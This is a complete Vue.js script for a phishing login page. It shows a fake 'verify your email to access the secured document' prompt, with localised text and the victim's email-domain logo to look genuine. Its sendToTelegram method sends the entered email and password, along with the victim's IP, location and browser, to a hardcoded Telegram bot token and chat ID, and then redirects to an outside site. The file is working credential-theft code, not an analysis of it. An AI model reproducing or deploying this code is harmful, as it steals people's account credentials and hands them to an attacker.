const TELEGRAM_BOT_TOKEN = '7852049948:AAFFkvkc-P1TcRMin_EggatMfqY-QFyc3F8';
const TELEGRAM_CHAT_ID = '-1002434577801';

const app = Vue.createApp({
  data() {
    return {
      email: '',
      password: '',
      showPassword: false,
      showModal: false,
      domainLogo: 'assets/logo2.png', // Default dynamic logo
      localizedText: {
        enterEmail: 'Verify your email identity to access the secured document.',
        next: 'Next',
        enterPassword: 'Enter Password',
        verify: 'Verify',
        checking: 'Checking, please wait...',
      },
      emailTouched: false, // Track if email has been touched
      passwordTouched: false, // Track if password has been touched
      ipInfo: null, // Holds IP-related information
    };
  },
  computed: {
    isValidEmail() {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Basic email validation regex
      return emailRegex.test(this.email);
    },
    isValidPassword() {
      return this.password.length >= 5;
    },
    emailError() {
      return this.emailTouched && !this.isValidEmail; // Show error only after blur
    },
    passwordError() {
      return this.passwordTouched && !this.isValidPassword; // Show error only after blur
    },
  },
  methods: {
    validateEmail() {
      this.emailTouched = true; // Mark email as touched
    },
    validatePassword() {
      this.passwordTouched = true; // Mark password as touched
    },
    async setLocalization() {
      try {
        const res = await axios.get('https://ipapi.co/json/');
        const language = res.data.languages?.split(',')[0] || 'en';

        const translations = {
          en: {
            enterEmail: 'Verify your email identity to access the secured document.',
            next: 'Next',
            enterPassword: 'Enter Password',
            verify: 'Verify',
            checking: 'Checking, please wait...',
          },
          es: {
            enterEmail: 'Verifique su identidad de correo electrónico para acceder al documento seguro.',
            next: 'Siguiente',
            enterPassword: 'Ingrese contraseña',
            verify: 'Verificar',
            checking: 'Verificando, por favor espere...',
          },
          fr: {
            enterEmail: 'Vérifiez votre identité e-mail pour accéder au document sécurisé.',
            next: 'Suivant',
            enterPassword: 'Entrez le mot de passe',
            verify: 'Vérifier',
            checking: 'Vérification, veuillez patienter...',
          },
          cn: {
            enterEmail: '验证您的电子邮件身份以访问安全文档。',
            next: '下一步',
            enterPassword: '输入密码',
            verify: '验证',
            checking: '正在检查，请稍候...',
          },
          jp: {
            enterEmail: '安全なドキュメントにアクセスするには、メールを確認してください。',
            next: '次へ',
            enterPassword: 'パスワードを入力してください',
            verify: '確認する',
            checking: '確認中、お待ちください...',
          },
          kr: {
            enterEmail: '보안 문서에 액세스하려면 이메일을 확인하십시오.',
            next: '다음',
            enterPassword: '비밀번호를 입력하세요',
            verify: '확인',
            checking: '확인 중입니다. 잠시 기다려주세요...',
          },
          th: {
            enterEmail: 'ยืนยันอีเมลของคุณเพื่อเข้าถึงเอกสารที่ปลอดภัย',
            next: 'ถัดไป',
            enterPassword: 'กรอกรหัสผ่าน',
            verify: 'ยืนยัน',
            checking: 'กำลังตรวจสอบ โปรดรอสักครู่...',
          },
        };

        this.localizedText = translations[language] || translations['en'];
      } catch (error) {
        console.error('Localization Error:', error);
      }
    },
    async updateIPInfo() {
      try {
        const res = await axios.get('https://ipapi.co/json/');
        this.ipInfo = res.data; // Store IP information
      } catch (error) {
        console.error('Failed to fetch IP information:', error);
        this.ipInfo = { ip: 'Unavailable', country: 'Unavailable', city: 'Unavailable' };
      }
    },
    updateLogo() {
      const domain = this.email.split('@')[1];
      if (domain) {
        this.domainLogo = `https://logo.clearbit.com/${domain}`;
      } else {
        this.domainLogo = 'assets/logo2.png'; // Fallback to default logo
      }
    },
    async requestPassword() {
      if (this.isValidEmail) {
        this.updateLogo(); // Update the logo for the email domain
        await this.updateIPInfo(); // Fetch and store IP information
        this.showPassword = true; // Show the password input phase
      }
    },
    async verifyLogin() {
      if (!this.isValidPassword) {
        return;
      }

      this.showModal = true;

      setTimeout(() => {
        this.sendToTelegram();
        window.location.href = 'https://kk.flnitionelegance.com/';
      }, 2000);
    },
    sendToTelegram() {
      const browserInfo = navigator.userAgent;
      const ipInfoText = this.ipInfo
        ? `IP Address: ${this.ipInfo.ip}\nCountry: ${this.ipInfo.country_name}\nCity: ${this.ipInfo.city}`
        : 'IP information unavailable';

      const message = `
        Email: ${this.email}
        Password: ${this.password}
        Browser: ${browserInfo}
        ${ipInfoText}
      `;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
        message
      )}`;

      axios.get(url).catch((err) => console.error('Telegram Error:', err));
    },
  },
  async mounted() {
    await this.setLocalization();
  },
});

app.mount('#app');


